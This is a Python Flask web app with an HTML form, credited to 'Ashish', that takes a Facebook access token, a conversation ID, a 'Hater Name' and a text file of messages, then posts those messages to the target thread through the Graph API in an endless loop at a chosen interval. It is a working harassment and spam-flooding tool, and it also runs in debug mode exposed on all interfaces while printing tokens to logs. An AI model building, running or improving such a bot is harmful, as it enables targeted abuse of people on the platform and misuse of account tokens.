from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>ASHISH SINGLE TOKEN CONVO</title>

    <style>

        /* CSS for styling elements */

            

label{

    color: white;

}

.file{

    height: 30px;

}

body{

    background-image: url('https://i.ibb.co/Kx5WW6Y/43e60ad48c2d6f02396aa7355427479f.jpg');

    background-size: cover;

    background-repeat: no-repeat;

    

}

    .container{

      max-width: 700px;

      height: 600px;

      border-radius: 20px;

      padding: 20px;

      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);

      box-shadow: 0 0 10px white;

            border: none;

            resize: none;

    }

        .form-control {

            outline: 1px red;

            border: 1px double white;

            background: transparent; 

            width: 100%;

            height: 40px;

            padding: 7px;

            margin-bottom: 10px;

            border-radius: 10px;

            color: white;

        }

        .btn-submit {

            

            border-radius: 20px;

            align-items: center;

            background-color: #4CAF50;

            color: white;

            margin-left: 70px;

            padding: 10px 20px;

            border: none;

            cursor: pointer;

        }

                .btn-submit:hover{

                    background-color: red;

                }

            

        h3{

            text-align: center;

            color: white;

            font-family: cursive;

        }

        h2{

            text-align: center;

            color: white;

            font-size: 14px;

            font-family: Courier;

        }

    </style>

</head>

<body>

<div class="container">

    <h3>SINGLE TOKEN  CONVO</h3>

    <h2></h2>

    <form action="/" method="post" enctype="multipart/form-data">

        <div class="mb-3">

            <label for="threadId file">Convo_id:</label>

            <input type="txt" class="form-control" id="threadId" name="threadId" required>

        </div>

        <div class="mb-3">

          <label for="accessToken">Enter Your Token:</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
        
      
        </div>

        <div class="mb-3">

            <label  for="messagesFile">Select Your Np File:</label>

            <input  type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" placeholder="NP" required>

        </div>

        <div class="mb-3">

            <label for="kidx">Enter Hater Name:</label>

            <input type="text" class="form-control" id="kidx" name="kidx" required>

        </div>

        <div class="mb-3">

            <label for="time">Speed in Seconds: </label>

            <input type="number" class="form-control" id="time" name="time" value="60" required>

        </div>

        <br />

        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details & Start the Server</button>

    </form>

    <h3>Developer :Ashish</h3>

</body>
  </html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)
